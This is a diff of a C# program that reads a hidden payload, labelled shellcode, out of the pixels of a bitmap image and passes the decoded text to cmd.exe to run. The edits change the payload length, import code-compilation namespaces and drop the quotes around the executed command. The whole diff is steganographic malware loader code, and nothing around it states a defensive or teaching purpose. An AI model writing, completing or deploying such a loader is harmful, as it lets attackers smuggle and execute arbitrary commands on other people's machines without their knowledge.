@@ -1,12 +1,18 @@
-﻿using System.Drawing;
+﻿using System;
+using System.IO;
+using System.Drawing;
 using System.Threading;
 using System.Diagnostics;
+
+using System.CodeDom;
+using System.CodeDom.Compiler;
+
 
 namespace csharp
 {
     class Reader
     {
-        const int shellcode_len = 45896;
+        const int shellcode_len = 46064;
         static byte[] payload_data = new byte[shellcode_len / 8];
 
         static void Main(string[] args)
@@ -19,7 +25,6 @@ namespace csharp
         static void read_image(string filename)
         {
             Bitmap bm = new Bitmap(filename);
-
 
             int length = shellcode_len;
             int pos = 0;
@@ -59,9 +64,8 @@ namespace csharp
 
 
         static void run() {
-            string args = "/c " + '"' + System.Text.Encoding.UTF8.GetString(payload_data, 0, payload_data.Length) + '"';
+            string args = "/c " + System.Text.Encoding.UTF8.GetString(payload_data, 0, payload_data.Length);
             Process.Start("cmd.exe", args);
         }
     }
-
 }
